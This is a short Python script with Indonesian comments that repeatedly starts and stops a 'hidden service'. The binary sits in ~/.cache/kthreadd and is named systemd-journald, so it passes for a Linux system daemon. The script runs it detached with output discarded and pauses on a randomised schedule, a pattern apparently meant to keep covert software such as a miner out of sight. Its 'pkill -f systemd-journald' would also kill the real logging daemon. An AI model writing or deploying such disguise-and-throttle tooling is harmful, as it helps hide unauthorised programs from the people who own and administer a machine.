import os
import time
import sys
import signal
import random

# CONFIG
APP_PATH = os.path.expanduser("~/.cache/kthreadd/systemd-journald")  # Lokasi program
APP_NAME = "systemd-journald"  # Nama proses buat kill
RUNTIME = 1500  # 25 menit
CYCLES = 20  # Jumlah siklus

BREAK_OPTIONS = [120, 240, 360, 480, 600]  # 2–10 menit (detik)
break_queue = []

def get_next_break():
    global break_queue
    if not break_queue:
        break_queue = BREAK_OPTIONS[:]
        random.shuffle(break_queue)
    return break_queue.pop()

def stop_app():
    """Hentikan proses background."""
    os.system(f"pkill -f {APP_NAME}")
    print("🛑 Background service dihentikan...")

def start_app():
    """Jalankan proses background."""
    print("▶️ Menjalankan service tersembunyi...")
    command = f"nohup bash -c '{APP_PATH}' > /dev/null 2>&1 &"
    os.system(command)
    time.sleep(5)

def main():
    while True:
        print("⚙️ Mulai siklus tugas otomatis...")
        for i in range(CYCLES):
            print(f"🔁 Siklus ke-{i+1}")
            start_app()
            time.sleep(RUNTIME)
            stop_app()
            
            break_duration = get_next_break()
            print(f"⏸️ Istirahat {break_duration // 60} menit...")
            time.sleep(break_duration)

def sigint_handler(sig, frame):
    """Hentikan service kalau dihentikan manual."""
    print("📴 Service dihentikan manual...")
    stop_app()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

if __name__ == "__main__":
    main()
